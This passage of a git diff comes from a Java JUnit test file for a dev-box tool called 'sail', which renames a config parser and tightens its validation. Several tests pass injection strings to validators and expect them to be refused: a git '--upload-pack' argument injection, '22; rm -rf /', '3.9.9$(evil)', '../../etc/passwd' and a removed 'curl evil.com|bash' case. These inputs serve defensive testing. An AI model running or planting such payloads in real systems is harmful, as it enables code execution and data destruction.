@@ -9,6 +9,7 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertNull;
+import static org.junit.jupiter.api.Assertions.assertSame;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
@@ -17,7 +18,7 @@ import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.Test;
 
-class SailYamlTest {
+class ProjectDefinitionTest {
 
   private static final String EXAMPLE_YAML =
       """
@@ -38,11 +39,6 @@ class SailYamlTest {
           jdk: 25
           node: 22
           maven: "3.9.9"
-
-        git:
-          name: "Acme Engineering"
-          email: "eng@acme.com"
-          auth: token
 
         repos:
           - url: "https://github.com/acme/backend.git"
@@ -81,16 +77,11 @@ class SailYamlTest {
           auto_snapshot: true
           config:
             permissions: full
-
-        ssh:
-          user: dev
-          authorized_keys:
-            - "ssh-ed25519 AAAA... alice@laptop"
         """;
 
   @Test
   void parsesCompleteYaml() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
     assertEquals("acme-health", config.name());
     assertEquals("Acme Health Platform", config.description());
@@ -106,10 +97,6 @@ class SailYamlTest {
     assertEquals(25, config.runtimes().jdk());
     assertEquals("22", config.runtimes().node());
     assertEquals("3.9.9", config.runtimes().maven());
-
-    assertEquals("Acme Engineering", config.git().name());
-    assertEquals("eng@acme.com", config.git().email());
-    assertEquals("token", config.git().auth());
 
     assertEquals(2, config.repos().size());
     assertEquals("acme-backend", config.repos().getFirst().path());
@@ -132,9 +119,6 @@ class SailYamlTest {
     assertEquals("sail/", config.agent().branchPrefix());
     assertTrue(config.agent().autoSnapshot());
     assertEquals("full", config.agent().config().get("permissions"));
-
-    assertEquals("dev", config.ssh().user());
-    assertEquals(1, config.ssh().authorizedKeys().size());
   }
 
   @Test
@@ -143,7 +127,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of("url", "--upload-pack=touch /tmp/pwned", "path", "evil")));
     assertTrue(ex.getMessage().contains("repos[].url"));
   }
@@ -152,20 +136,43 @@ class SailYamlTest {
   void repoFromMapRejectsUrlWithoutKnownScheme() {
     assertThrows(
         IllegalArgumentException.class,
-        () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
+        () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
   }
 
   @Test
-  void repoFromMapAcceptsHttpsAndScpUrls() {
+  void aRepoIsClonedOverHttpsAndAnSshUrlIsRefusedNamingItsHttpsForm() {
     var https =
-        SailYaml.Repo.fromMap(
-            java.util.Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
+        ProjectDefinition.Repo.fromMap(
+            Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
     assertEquals("https://github.com/acme/backend.git", https.url());
 
-    var scp =
-        SailYaml.Repo.fromMap(
-            java.util.Map.of("url", "git@github.com:acme/backend.git", "path", "backend"));
-    assertEquals("git@github.com:acme/backend.git", scp.url());
+    assertEquals(
+        "repos[].url 'git@github.com:acme/backend.git' is not an https URL: sail clones over https"
+            + " with the box's forge token. Use https://github.com/acme/backend.git.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "git@github.com:acme/backend.git", "path", "backend")))
+            .getMessage());
+    assertEquals(
+        "repos[].url 'ssh://git@git.acme.dev:2222/org/api.git' is not an https URL: sail clones"
+            + " over https with the box's forge token. Use https://git.acme.dev/org/api.git.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "ssh://git@git.acme.dev:2222/org/api.git", "path", "api")))
+            .getMessage());
+    assertEquals(
+        "repos[].url 'git://example.com/x.git' is not an https URL: sail clones over https with"
+            + " the box's forge token. Use the repository's https URL.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "git://example.com/x.git", "path", "x")))
+            .getMessage());
   }
 
   @Test
@@ -173,7 +180,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Resources.fromMap(java.util.Map.of("memory", "8GB", "disk", "50GB")));
+            () ->
+                ProjectDefinition.Resources.fromMap(
+                    java.util.Map.of("memory", "8GB", "disk", "50GB")));
     assertTrue(ex.getMessage().contains("resources.cpu"));
   }
 
@@ -182,13 +191,13 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
+            () -> ProjectDefinition.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
     assertTrue(ex.getMessage().contains("resources.memory"));
   }
 
   @Test
   void runtimesDefaultsToZeroWhenMissing() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of());
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of());
     assertEquals(0, runtimes.jdk());
     assertNull(runtimes.node());
     assertNull(runtimes.maven());
@@ -196,7 +205,7 @@ class SailYamlTest {
 
   @Test
   void runtimesFromMapParsesPartialConfig() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25));
     assertEquals(25, runtimes.jdk());
     assertNull(runtimes.node());
     assertNull(runtimes.maven());
@@ -204,93 +213,9 @@ class SailYamlTest {
 
   @Test
   void runtimesFromMapParsesMaven() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
+    var runtimes =
+        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
     assertEquals("3.9.9", runtimes.maven());
-  }
-
-  @Test
-  void gitFromMapDefaultsAuthToToken() {
-    var git = SailYaml.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
-    assertEquals("token", git.auth());
-  }
-
-  @Test
-  void gitFromMapAcceptsSshAuth() {
-    var git =
-        SailYaml.Git.fromMap(
-            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
-    assertEquals("ssh", git.auth());
-  }
-
-  @Test
-  void gitFromMapThrowsOnMissingName() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> SailYaml.Git.fromMap(java.util.Map.of("email", "test@test.com")));
-    assertTrue(ex.getMessage().contains("git.name"));
-  }
-
-  @Test
-  void gitFromMapThrowsOnMissingEmail() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> SailYaml.Git.fromMap(java.util.Map.of("name", "Test")));
-    assertTrue(ex.getMessage().contains("git.email"));
-  }
-
-  @Test
-  void gitFromMapThrowsOnInvalidAuth() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () ->
-                SailYaml.Git.fromMap(
-                    java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "bad")));
-    assertTrue(ex.getMessage().contains("git.auth"));
-  }
-
-  @Test
-  void gitFromMapParsesSshKey() {
-    var map = new java.util.HashMap<String, Object>();
-    map.put("name", "Test");
-    map.put("email", "test@test.com");
-    map.put("auth", "ssh");
-    map.put("ssh_key", "~/.ssh/id_ed25519");
-    var git = SailYaml.Git.fromMap(map);
-    assertEquals("ssh", git.auth());
-    assertEquals("~/.ssh/id_ed25519", git.sshKey());
-  }
-
-  @Test
-  void gitFromMapSshKeyNullWhenAbsent() {
-    var git =
-        SailYaml.Git.fromMap(
-            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
-    assertNull(git.sshKey());
-  }
-
-  @Test
-  void gitToMapIncludesSshKeyWhenSet() {
-    var git = new SailYaml.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
-    var map = git.toMap();
-    assertEquals("~/.ssh/id_ed25519", map.get("ssh_key"));
-  }
-
-  @Test
-  void gitToMapOmitsSshKeyWhenNull() {
-    var git = new SailYaml.Git("Test", "test@test.com", "token", null);
-    var map = git.toMap();
-    assertFalse(map.containsKey("ssh_key"));
-  }
-
-  @Test
-  void gitSshKeyRoundTripsViaToMapFromMap() {
-    var original = new SailYaml.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
-    var roundTripped = SailYaml.Git.fromMap(original.toMap());
-    assertEquals("ssh", roundTripped.auth());
-    assertEquals("~/.ssh/id_ed25519", roundTripped.sshKey());
   }
 
   @Test
@@ -298,7 +223,7 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Repo.fromMap(java.util.Map.of("path", "my-repo")));
+            () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("path", "my-repo")));
     assertTrue(ex.getMessage().contains("repos[].url"));
   }
 
@@ -307,7 +232,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "https://github.com/foo/bar")));
+            () ->
+                ProjectDefinition.Repo.fromMap(
+                    java.util.Map.of("url", "https://github.com/foo/bar")));
     assertTrue(ex.getMessage().contains("repos[].path"));
   }
 
@@ -317,7 +244,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of(
                         "url", "https://github.com/foo/bar", "path", "../../etc/passwd")));
     assertTrue(ex.getMessage().contains("repos[].path"));
@@ -329,7 +256,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of(
                         "url",
                         "https://github.com/foo/bar",
@@ -341,21 +268,26 @@ class SailYamlTest {
   }
 
   @Test
-  void sshFromMapRejectsInvalidUser() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> SailYaml.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
-    assertTrue(ex.getMessage().contains("Invalid ssh.user"));
-  }
-
-  @Test
   void runtimesFromMapRejectsInvalidMavenVersion() {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
+            () ->
+                ProjectDefinition.Runtimes.fromMap(
+                    java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
     assertTrue(ex.getMessage().contains("runtimes.maven"));
+  }
+
+  @Test
+  void aJdkVersionBelowOneIsRefusedRatherThanDroppedOnTheNextWrite() {
+    for (var jdk : List.of(0, -3)) {
+      assertEquals(
+          "runtimes.jdk must be a JDK major version such as 25, got: " + jdk,
+          assertThrows(
+                  IllegalArgumentException.class,
+                  () -> ProjectDefinition.Runtimes.fromMap(Map.of("jdk", jdk)))
+              .getMessage());
+    }
   }
 
   @Test
@@ -363,7 +295,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
+            () ->
+                ProjectDefinition.Runtimes.fromMap(
+                    java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
     assertTrue(ex.getMessage().contains("runtimes.node"));
   }
 
@@ -376,7 +310,7 @@ class SailYamlTest {
     var serviceMap =
         java.util.Map.<String, Object>of("image", "meilisearch:latest", "environment", envMap);
 
-    var service = SailYaml.Service.fromMap(serviceMap);
+    var service = ProjectDefinition.Service.fromMap("meilisearch", serviceMap);
 
     assertEquals("development", service.environment().get("MEILI_ENV"));
     assertEquals("true", service.environment().get("MEILI_NO_ANALYTICS"));
@@ -385,39 +319,26 @@ class SailYamlTest {
 
   @Test
   void runtimesNodePreservesDoubleVersion() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
     assertEquals("22.4", runtimes.node());
   }
 
   @Test
   void runtimesNodeWholeDoubleBecomesInteger() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
     assertEquals("22", runtimes.node());
   }
 
   @Test
   void runtimesNodeStringVersionWithMultipleDots() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
+    var runtimes =
+        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
     assertEquals("24.13.1", runtimes.node());
   }
 
   @Test
-  void sshUserReturnsSshUserWhenConfigured() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
-
-    assertEquals("dev", config.sshUser());
-  }
-
-  @Test
-  void sshUserDefaultsToDevWhenNoSshBlock() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
-
-    assertEquals("dev", config.sshUser());
-  }
-
-  @Test
   void repoPathsReturnsAbsolutePathsForEachRepo() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
     var paths = config.repoPaths();
 
@@ -428,66 +349,12 @@ class SailYamlTest {
 
   @Test
   void repoPathsReturnsWorkspaceRootWhenNoRepos() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
 
     var paths = config.repoPaths();
 
     assertEquals(1, paths.size());
     assertEquals("/home/dev/workspace", paths.getFirst());
-  }
-
-  @Test
-  void repoPathsUsesSshUser() throws Exception {
-    var yaml =
-        """
-        name: test
-        ssh:
-          user: alice
-        repos:
-          - url: "https://github.com/test/app.git"
-            path: "app"
-        """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
-
-    assertEquals("/home/alice/workspace/app", config.repoPaths().getFirst());
-  }
-
-  @Test
-  void retiredGuardrailKeyNamesTheProjectAndExactEdit() {
-    var yaml =
-        """
-        name: test
-        agent:
-          type: claude-code
-          guardrails:
-            idle_timeout: 90m
-        """;
-    var refusal =
-        assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)));
-
-    assertEquals(
-        "Unknown guardrail key `idle_timeout` in test/sail.yaml; rename `idle_timeout` to"
-            + " `max_idle` in test/sail.yaml.",
-        refusal.getMessage());
-  }
-
-  @Test
-  void specsDirIsRejectedWithAnExactEdit() {
-    var yaml =
-        """
-        name: test
-        agent:
-          type: claude-code
-          specs_dir: specs
-        """;
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)));
-    assertEquals(
-        "Unknown agent key `specs_dir` in test/sail.yaml; remove `specs_dir` from test/sail.yaml"
-            + " because specs live in the Sail database.",
-        ex.getMessage());
   }
 
   @Test
@@ -498,7 +365,7 @@ class SailYamlTest {
         agent:
           type: claude-code
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNull(config.agent().guardrails());
   }
@@ -516,7 +383,7 @@ class SailYamlTest {
               - guardrail_triggered
               - agent_session_stopped
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNotNull(config.agent().notifications());
     assertEquals("https://ntfy.sh/singlr-test", config.agent().notifications().url());
@@ -531,7 +398,7 @@ class SailYamlTest {
         agent:
           type: claude-code
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNull(config.agent().notifications());
   }
@@ -544,11 +411,10 @@ class SailYamlTest {
             description: "Just a name and description"
             """;
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(minimal));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(minimal));
 
     assertEquals("simple-project", config.name());
     assertNull(config.resources());
-    assertNull(config.git());
     assertNull(config.repos());
     assertNull(config.services());
     assertNull(config.agent());
@@ -556,9 +422,9 @@ class SailYamlTest {
 
   @Test
   void toMapRoundTripsCompleteConfig() throws Exception {
-    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
     var map = original.toMap();
-    var roundTripped = SailYaml.fromMap(map);
+    var roundTripped = ProjectDefinition.fromMap(map);
 
     assertEquals(original.name(), roundTripped.name());
     assertEquals(original.description(), roundTripped.description());
@@ -570,10 +436,6 @@ class SailYamlTest {
     assertEquals(original.runtimes().jdk(), roundTripped.runtimes().jdk());
     assertEquals(original.runtimes().node(), roundTripped.runtimes().node());
     assertEquals(original.runtimes().maven(), roundTripped.runtimes().maven());
-    assertEquals(original.git().name(), roundTripped.git().name());
-    assertEquals(original.git().email(), roundTripped.git().email());
-    assertEquals(original.git().auth(), roundTripped.git().auth());
-    assertEquals(original.git().sshKey(), roundTripped.git().sshKey());
     assertEquals(original.repos().size(), roundTripped.repos().size());
     assertEquals(original.repos().getFirst().url(), roundTripped.repos().getFirst().url());
     assertEquals(original.repos().getFirst().branch(), roundTripped.repos().getFirst().branch());
@@ -585,28 +447,26 @@ class SailYamlTest {
     assertEquals(original.agent().type(), roundTripped.agent().type());
     assertEquals(original.agent().autoBranch(), roundTripped.agent().autoBranch());
     assertEquals(original.agent().autoSnapshot(), roundTripped.agent().autoSnapshot());
-    assertEquals(original.ssh().user(), roundTripped.ssh().user());
-    assertEquals(original.ssh().authorizedKeys(), roundTripped.ssh().authorizedKeys());
+    assertEquals(original, roundTripped, "every section round-trips");
   }
 
   @Test
   void toMapOmitsNullFields() throws Exception {
-    var minimal = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var minimal = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
     var map = minimal.toMap();
 
     assertEquals("test", map.get("name"));
     assertFalse(map.containsKey("resources"));
     assertFalse(map.containsKey("runtimes"));
-    assertFalse(map.containsKey("git"));
     assertFalse(map.containsKey("repos"));
     assertFalse(map.containsKey("services"));
     assertFalse(map.containsKey("agent"));
-    assertFalse(map.containsKey("ssh"));
+    assertFalse(map.containsKey("pipeline"));
   }
 
   @Test
   void toMapPreservesServiceEnvironment() throws Exception {
-    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
     var map = original.toMap();
     @SuppressWarnings("unchecked")
     var services = (java.util.Map<String, Object>) map.get("services");
@@ -630,85 +490,21 @@ class SailYamlTest {
             max_duration: 4h
             action: snapshot-and-stop
         """;
-    var original = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
     var map = original.toMap();
-    var roundTripped = SailYaml.fromMap(map);
+    var roundTripped = ProjectDefinition.fromMap(map);
 
     assertEquals("4h", roundTripped.agent().guardrails().maxDuration());
     assertEquals("snapshot-and-stop", roundTripped.agent().guardrails().action());
   }
 
   @Test
-  void withNodeRuntimeAddsNodeToExistingRuntimes() throws Exception {
-    var yaml =
-        """
-        name: test
-        resources:
-          cpu: 2
-          memory: 4GB
-          disk: 20GB
-        runtimes:
-          jdk: 25
-          maven: "3.9.9"
-        agent:
-          type: codex
-        """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
-
-    var updated = config.withNodeRuntime("24.14.1");
-
-    assertEquals(25, updated.runtimes().jdk());
-    assertEquals("24.14.1", updated.runtimes().node());
-    assertEquals("3.9.9", updated.runtimes().maven());
-    assertEquals("test", updated.name());
-    assertEquals("codex", updated.agent().type());
-  }
-
-  @Test
-  void withNodeRuntimeCreatesRuntimesWhenNull() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
-
-    var updated = config.withNodeRuntime("22.0.0");
-
-    assertNotNull(updated.runtimes());
-    assertEquals("22.0.0", updated.runtimes().node());
-    assertEquals(0, updated.runtimes().jdk());
-    assertNull(updated.runtimes().maven());
-  }
-
-  @Test
-  void withAgentInstallReplacesInstallList() throws Exception {
-    var yaml =
-        """
-        name: test
-        agent:
-          type: claude-code
-          auto_branch: true
-          install:
-            - claude-code
-            - codex
-        """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
-
-    var updated = config.withAgentInstall(List.of("claude-code"));
-
-    assertEquals(List.of("claude-code"), updated.agent().install());
-    assertEquals("claude-code", updated.agent().type());
-    assertTrue(updated.agent().autoBranch());
-  }
-
-  @Test
   void eachLaneReadsItsOwnGuardrailsAndItsOwnDefaults() {
-    var bare = SailYaml.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = definition(Map.of("type", "claude-code"), null);
     var configured =
-        SailYaml.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_duration", "6h"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_duration", "90m", "max_idle", "30m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_duration", "6h")),
+            Map.of("guardrails", Map.of("max_duration", "90m", "max_idle", "30m")));
 
     for (var lane : Lane.values()) {
       var review = lane == Lane.REVIEW;
@@ -724,27 +520,29 @@ class SailYamlTest {
     assertEquals(Guardrails.defaults(), bare.guardrailsFor(null), "an unknown lane is a build's");
   }
 
+  /** A definition named acme with {@code agent} and {@code pipeline} as its sections. */
+  private static ProjectDefinition definition(
+      Map<String, Object> agent, Map<String, Object> pipeline) {
+    var map = new java.util.LinkedHashMap<String, Object>();
+    map.put("name", "acme");
+    map.put("agent", agent);
+    if (pipeline != null) {
+      map.put("pipeline", pipeline);
+    }
+    return ProjectDefinition.fromMap(map);
+  }
+
   @Test
   void aRunsLifetimeIsItsLanesLimitAndABuildNothingBoundsHasNone() {
-    var bare = SailYaml.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = definition(Map.of("type", "claude-code"), null);
     var configured =
-        SailYaml.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_duration", "6h"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_duration", "90m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_duration", "6h")),
+            Map.of("guardrails", Map.of("max_duration", "90m")));
     var unlimited =
-        SailYaml.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_idle", "30m"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_idle", "30m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_idle", "30m")),
+            Map.of("guardrails", Map.of("max_idle", "30m")));
 
     for (var lane : Lane.values()) {
       var review = lane == Lane.REVIEW;
@@ -760,26 +558,28 @@ class SailYamlTest {
   }
 
   @Test
-  void anInvalidReviewLaneGuardrailFailsTheDescriptorWhereItIsValidated() {
+  void anInvalidReviewLaneGuardrailIsRefusedNamingTheField() {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
-                    Map.of(
-                        "type",
-                        "claude-code",
-                        "review_pipeline",
-                        Map.of("guardrails", Map.of("max_duration", "1 hour"))),
-                    "acme/sail.yaml"));
+                definition(
+                    Map.of("type", "claude-code"),
+                    Map.of("guardrails", Map.of("max_duration", "1 hour"))));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith(
-                "Invalid `agent.review_pipeline.guardrails.max_duration` in acme/sail.yaml: "),
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails.max_duration`: "),
         refused.getMessage());
     assertTrue(refused.getMessage().contains("4h, 90m, 30s"), refused.getMessage());
+    assertEquals(
+        "Invalid `agent.guardrails.max_duration`: write it as text such as 45m, 4h or 90s.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    definition(
+                        Map.of("type", "claude-code", "guardrails", Map.of("max_duration", 90)),
+                        null))
+            .getMessage());
   }
 
   @Test
@@ -787,17 +587,11 @@ class SailYamlTest {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
-            () ->
-                SailYaml.Agent.fromMap(
-                    Map.of("type", "claude-code", "review_pipeline", Map.of("guardrails", "90m")),
-                    "acme/sail.yaml"));
+            () -> definition(Map.of("type", "claude-code"), Map.of("guardrails", "90m")));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith("Invalid `agent.review_pipeline.guardrails` in acme/sail.yaml: "),
-        refused.getMessage());
-    assertTrue(refused.getMessage().contains("max_duration: 45m"), refused.getMessage());
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails`: "), refused.getMessage());
+    assertTrue(refused.getMessage().contains("\"max_duration\": \"45m\""), refused.getMessage());
   }
 
   @Test
@@ -805,140 +599,90 @@ class SailYamlTest {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
-            () ->
-                SailYaml.Agent.fromMap(
-                    Map.of("type", "claude-code", "guardrails", "4h"), "acme/sail.yaml"));
+            () -> definition(Map.of("type", "claude-code", "guardrails", "4h"), null));
 
     assertTrue(
-        refused.getMessage().startsWith("Invalid `agent.guardrails` in acme/sail.yaml: "),
-        refused.getMessage());
+        refused.getMessage().startsWith("Invalid `agent.guardrails`: "), refused.getMessage());
   }
 
   @Test
-  void anActionSailDoesNotKnowIsRefusedNamingItsBlockItsFileAndTheOnesItDoes() {
+  void anActionSailDoesNotKnowIsRefusedNamingItsBlockAndTheOnesItDoes() {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
-                    Map.of(
-                        "type",
-                        "claude-code",
-                        "review_pipeline",
-                        Map.of("guardrails", Map.of("action", "halt"))),
-                    "acme/sail.yaml"));
+                definition(
+                    Map.of("type", "claude-code"), Map.of("guardrails", Map.of("action", "halt"))));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith("Invalid `agent.review_pipeline.guardrails.action` in acme/sail.yaml: "),
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails.action`: "),
         refused.getMessage());
     assertTrue(
         refused.getMessage().contains("stop, snapshot-and-stop, notify"), refused.getMessage());
   }
 
   @Test
-  void theReviewPipelineSurvivesAnAgentRoundTripAndAnInstallListChange() {
-    var agent =
-        SailYaml.Agent.fromMap(
+  void theReviewPipelineIsASectionOfItsOwnThatSurvivesARoundTripAndAnInstallListChange() {
+    var config =
+        definition(
+            Map.of("type", "claude-code"),
             Map.of(
-                "type",
-                "claude-code",
-                "review_pipeline",
-                Map.of(
-                    "guardrails",
-                    Map.of("max_duration", "90m"),
-                    "stages",
-                    List.of(
-                        Map.of(
-                            "name",
-                            "security",
-                            "agent",
-                            "codex",
-                            "brief",
-                            "Judge the security surface.",
-                            "gate",
-                            "no_critical_or_high"),
-                        Map.of("name", "sign-off", "type", "human")))));
+                "guardrails",
+                Map.of("max_duration", "90m"),
+                "stages",
+                List.of(
+                    Map.of(
+                        "name",
+                        "security",
+                        "agent",
+                        "codex",
+                        "brief",
+                        "Judge the security surface.",
+                        "gate",
+                        "no_critical_or_high"),
+                    Map.of("name", "sign-off", "type", "human"))));
 
     @SuppressWarnings("unchecked")
-    var pipeline = (Map<String, Object>) agent.toMap().get("review_pipeline");
-    var reparsed = SailYaml.fromMap(Map.of("name", "acme", "agent", agent.toMap()));
-    var reinstalled = reparsed.withAgentInstall(List.of("claude-code", "codex"));
+    var pipeline = (Map<String, Object>) config.toMap().get("pipeline");
+    var reparsed = ProjectDefinition.fromMap(config.toMap());
 
     assertEquals(Map.of("max_duration", "90m", "action", "stop"), pipeline.get("guardrails"));
+    assertFalse(config.agent().toMap().containsKey("review_pipeline"));
     assertEquals(
-        agent.reviewPipeline(),
-        reparsed.agent().reviewPipeline(),
-        "the block a pipeline writes parses back to the same pipeline, stages included");
-    assertEquals(
-        agent.reviewPipeline(),
-        reinstalled.agent().reviewPipeline(),
-        "changing the install list keeps the pipeline, its stages and its limits");
-  }
-
-  @Test
-  void aDeletedKeyIsRefusedInOneSentenceNamingWhereItsTextGoes() {
-    var agent = "name: acme\nagent:\n  type: claude-code\n";
-
-    assertEquals(
-        "agent_context is no longer read: sail writes no context file. Put what it said in the"
-            + " repo's AGENTS.md, and a rule in a project skill (sail project skills add). Then"
-            + " remove `agent_context` from acme/sail.yaml.",
-        refusal(agent + "agent_context:\n  tech_stack: Java\n"));
-    assertEquals(
-        "agent.methodology is no longer read: sail's work prompt tells the agent to run the"
-            + " project's verification. Put the commands in the repo's AGENTS.md. Then remove"
-            + " `agent.methodology` from acme/sail.yaml.",
-        refusal(agent + "  methodology:\n    verify: mvn verify\n"));
-    assertEquals(
-        "agent.build_skill is no longer read: sail's work prompt says how a build runs. Put what"
-            + " the skill said in the repo's AGENTS.md, or keep it as a project skill (sail"
-            + " project skills add) the agent invokes when relevant. Then remove `agent.build_skill` from"
-            + " acme/sail.yaml.",
-        refusal(agent + "  build_skill: acme-build\n"));
-    assertEquals(
